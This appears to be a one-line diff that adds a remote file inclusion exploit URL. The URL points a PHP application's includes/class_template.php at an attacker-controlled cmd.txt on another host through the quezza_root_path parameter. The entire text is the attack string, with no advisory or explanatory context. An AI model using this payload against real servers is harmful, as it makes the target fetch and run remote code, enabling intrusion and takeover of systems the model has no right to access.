@@ -1,0 +1,1 @@
+http://www.example.com/[QuezzaPath]/includes/class_template.php?quezza_root_path=http://www.example2.com/cmd.txt?
